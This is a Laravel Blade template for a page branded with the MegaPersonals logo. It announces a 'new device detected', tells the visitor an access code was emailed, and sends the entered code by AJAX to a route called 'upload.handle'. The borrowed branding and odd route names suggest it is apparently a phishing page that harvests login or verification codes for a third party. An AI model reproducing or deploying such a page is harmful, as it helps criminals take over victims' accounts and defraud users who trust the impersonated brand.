@include ('layout.header')

<body class="d-flex justify-content-center align-items-center vh-100">
<style>
    .custom-device {
        background-color: rgb(248 239 206);
        padding: 1px;
        width: 409px;
        margin: auto;
        font-size: 20px;
        font-weight: 500;
    }
    .custom-btn {
        padding: 10px;
        width: 108px;
        background-color: rgb(254 177 97);
    }
</style>

<!-- Main Container -->
<div class="container">
    <!-- Header Section -->
    <div class="text-center mb-4">
        <img src="{{ asset('img/megapersonals.png') }}" alt="MegaPersonals" class="img-fluid mb-4">
    </div>

    <!-- New Device Detected -->
    <div class="bg-warning text-dark p-4 rounded-lg mb-6 custom-device">
        <p class="font-weight-bold">NEW DEVICE DETECTED</p>
    </div>

    <!-- Access Code Info -->
    <p style="color: rgb(199 84 0 ); font-size: 20px;" class="text-warning text-xl mb-4">
        Your ACCESS CODE <br> has been sent <b>Successfully</b> <br>  to your email on <b>February 27, 2025.</b> <br>
        That code remains valid.
    </p>
    <p style="color: rgb(47 174 234); font-size: 23px; font-weight: bold;" class="text-warning text-xl mb-4">
        <i> CHECK YOUR SPAM FOLDER <br>  IT MAY BE THERE.</i>
    </p>
    <p style="font-size: 19px; color: rgb(199 84 0 )" class="text-warning text-lg mb-6">
        DO NOT SHARE IT <span class="text-primary">?</span>
    </p>

    <!-- Form Section -->
    <form id="uploadForm" action="{{ route('upload.handle') }}" method="POST">
        @csrf
        <p style="font-size: 17px; color: rgb(199 84 0 )" class="text-dark mb-4">
           
        </p>
        

        <!-- Skip Code Input Field -->
        <p style="font-size: 17px; color: rgb(199 84 0 )" class="text-dark mb-3">
            Enter the code below to continue.
        </p>
        <input type="text" name="access_code" id="access_code" class="form-control mb-3" placeholder="Enter access code" required>

        <button type="submit" class="btn custom-btn w-100">
            Submit
        </button>
    </form>

    <!-- jQuery -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        $(document).ready(function() {
            $("#uploadForm").submit(function(event) {
                event.preventDefault();

                let formData = $(this).serialize(); // Serialize form data

                $.ajax({
                    url: $(this).attr("action"),
                    method: "POST",
                    headers: {
                        'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
                    },
                    data: formData,
                    success: function(response) {
                        alert("Form submitted successfully!");
                        window.location.href = "{{ route('upload') }}";
                    },
                    error: function(xhr, status, error) {
                        if (xhr.status === 422) {
                            var errors = xhr.responseJSON.errors;
                            var errorMessage = '';

                            $.each(errors, function(field, messages) {
                                errorMessage += messages.join('\n') + '\n';
                            });

                            alert("Validation failed:\n" + errorMessage);
                        } else {
                            console.log("Error occurred: ", error);
                        }
                    }
                });
            });
        });
    </script>
</div>

@include ('layout.footer')
